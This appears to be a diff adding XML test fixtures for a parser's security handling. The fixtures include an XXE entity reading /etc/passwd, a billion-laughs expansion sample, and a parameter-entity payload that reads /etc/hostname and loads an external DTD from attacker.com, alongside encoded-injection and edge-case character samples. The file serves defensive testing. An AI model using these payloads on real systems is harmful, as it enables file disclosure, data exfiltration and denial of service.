@@ -1,0 +1,63 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root id="test1">
+  &xxe;
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<foo>
+  <bar>&lol3;</bar>
+</foo>
+```
+
+```xml
+<!DOCTYPE html [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<html>
+  <body>
+    <p>Test content with parameter entity</p>
+  </body>
+</html>
+```
+
+```xml
+<?xml version="1.0"?>
+<root xmlns:foo="http://example.com/foo"
+      xmlns:bar="http://example.com/bar">
+  <foo:element attr="&#60;![CDATA[injection&#93;&#62;">
+    <bar:nested>
+      Content with &#x3c;script&#x3e; entity encoding
+    </bar:nested>
+  </foo:element>
+</root>
+```
+
+```xml
+<!DOCTYPE config [
+  <!ELEMENT config (setting)*>
+  <!ELEMENT setting (#PCDATA)>
+  <!ATTLIST setting name CDATA #REQUIRED>
+  <!NOTATION pdf PUBLIC "application/pdf">
+  <!ENTITY unparsed SYSTEM "data.bin" NDATA pdf>
+]>
+<config>
+  <setting name="test1">value&#x00;</setting>
+  <setting name="test2">&#65535;</setting>
+  <setting name="test3">&lt;tag&gt;</setting>
+</config>
+```
